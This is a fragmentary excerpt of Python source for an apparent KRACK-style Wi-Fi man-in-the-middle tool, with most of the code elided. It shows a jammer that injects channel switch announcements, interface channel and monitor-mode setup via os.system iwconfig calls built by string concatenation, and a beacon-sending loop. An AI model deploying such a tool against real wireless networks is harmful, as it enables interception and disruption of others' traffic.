...
class Jammer:
    ...
    def append_csa(p, channel, count=1):
        ...
        prevel.payload = Jammer.construct_csa(channel, count)
...
class Krack:
    ...
    def set_iface_ap_channel(self):
        logger.log("Setting interface to AP [G]" + self.iface_ap + "[/G] on channel [G]" + str(self.ap_channel) + "[/G]")
        try:
            os.system("iwconfig " + self.iface_ap + " channel " + str(self.ap_channel))
        except Exception:
            logger.log("Channel setting failed.", "error")
            sys.exit()
        logger.log("Interface to AP [G]" + self.iface_ap + "[/G] is on channel [G]" + str(self.ap_channel) + "[/G]",
                   "success")

    def set_iface_client_channel(self):
        logger.log(
            "Setting interface to Client [G]" + self.iface_client + "[/G] on channel [G]" + str(self.client_channel) + "[/G]",
            "info")
        try:
            ...
            sys.exit()
        logger.log(
            "Interface to Client [G]" + self.iface_client + "[/G] is on channel [G]" + str(self.client_channel) + "[/G]",
            "success")

    def start_ap_mon_mode(self):
        try:
            logger.log("Starting monitor mode for interface to AP [G]" + self.iface_ap + "[/G]")
            os.system('iwconfig %s mode monitor' % self.iface_ap)
            logger.log("Interface to AP [G]" + self.iface_ap + "[/G] is now in monitor mode", "success")
        except Exception:
    ...
    def start_client_mon_mode(self):
        try:
            logger.log("Starting monitor mode for interface to Client [G]" + self.iface_client + "[/G]")
            os.system('iwconfig %s mode monitor' % self.iface_client)
            logger.log("Interface to Client [G]" + self.iface_client + "[/G] is now in monitor mode", "success")
        except Exception:
            logger.log("Could not start monitor mode", "error")
            sys.exit()
    ...
    def send_ap_beacon(self):
        ...
        while True:
            ...
            #clear checksum
            #self.ap_beacon.show2()
            #dir(self.ap_beacon)
            #logger.log(self.ap_beacon, "error")
            #logger.log(dir(self.ap_beacon), "error")
            #logger.log(type(self.ap_beacon), "error")
            #import time
            #time.sleep(400)
...
if __name__ == "__main__":
    ...
    5. Start Jamming
    """
    jammer = Jammer(args, krack.ap_beacon)
